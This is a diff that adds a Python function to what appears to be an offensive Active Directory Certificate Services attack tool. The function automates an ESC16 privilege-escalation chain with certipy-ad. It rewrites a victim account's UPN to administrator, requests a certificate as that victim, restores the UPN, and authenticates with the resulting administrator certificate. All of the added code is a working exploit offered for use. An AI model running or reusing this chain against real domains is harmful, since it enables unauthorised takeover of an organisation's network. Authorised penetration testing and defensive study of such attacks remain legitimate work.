@@ -278,3 +278,72 @@ def exploit_esc9(username, password, domain, dc_ip, ca_name, template_name):
         "-dc-ip", dc_ip,
         "-domain", domain
     ], check=True)
+
+def exploit_esc16(username, password, domain, dc_ip, ca_name):
+    print("\n[!] ESC16 Exploitation - Security Extension Disabled")
+    print("[!] This requires a target user with certificate enrollment permissions")
+    
+    # Get target user credentials
+    target_user = input("Target User (Member of Service Accounts, ADCS group, Certificate Group): ")
+    target_pass = input(f"Password for {target_user}: ")
+    
+    victim_user = username.split('@')[0] if '@' in username else username.split('\\')[-1]
+    dc_host = f"DC01.{domain}"  # You might want to make this configurable
+    
+    print("\n[*] Exploiting ESC16 vulnerability...")
+    
+    # Step 1: Update victim's UPN to Administrator
+    print("[*] Updating victim's UPN to Administrator...")
+    subprocess.run([
+        "certipy-ad", "account",
+        "-u", f"{target_user}@{domain}",
+        "-p", target_pass,
+        "-target", dc_host,
+        "-upn", f"administrator@{domain}",
+        "-user", victim_user,
+        "update"
+    ], check=True)
+    
+    # Step 2: Verify the update
+    print("[*] Verifying UPN change...")
+    subprocess.run([
+        "certipy-ad", "account",
+        "-u", f"{target_user}@{domain}",
+        "-p", target_pass,
+        "-target", dc_host,
+        "-user", victim_user,
+        "read"
+    ], check=True)
+    
+    # Step 3: Request certificate as victim
+    print("[*] Requesting certificate as victim...")
+    subprocess.run([
+        "certipy-ad", "req",
+        "-dc-ip", dc_ip,
+        "-u", f"{victim_user}@{domain}",
+        "-p", password,
+        "-target", domain,
+        "-ca", ca_name,
+        "-template", "User"
+    ], check=True)
+    
+    # Step 4: Reset victim's UPN back to original
+    print("[*] Resetting victim's UPN back to original...")
+    subprocess.run([
+        "certipy-ad", "account",
+        "-u", f"{target_user}@{domain}",
+        "-p", target_pass,
+        "-target", dc_host,
+        "-upn", f"{victim_user}@{domain}",
+        "-user", victim_user,
+        "update"
+    ], check=True)
+    
+    # Step 5: Authenticate with the certificate
+    print("[*] Authenticating with the obtained certificate...")
+    subprocess.run([
+        "certipy-ad", "auth",
+        "-pfx", "administrator.pfx",
+        "-dc-ip", dc_ip,
+        "-domain", domain
+    ], check=True)
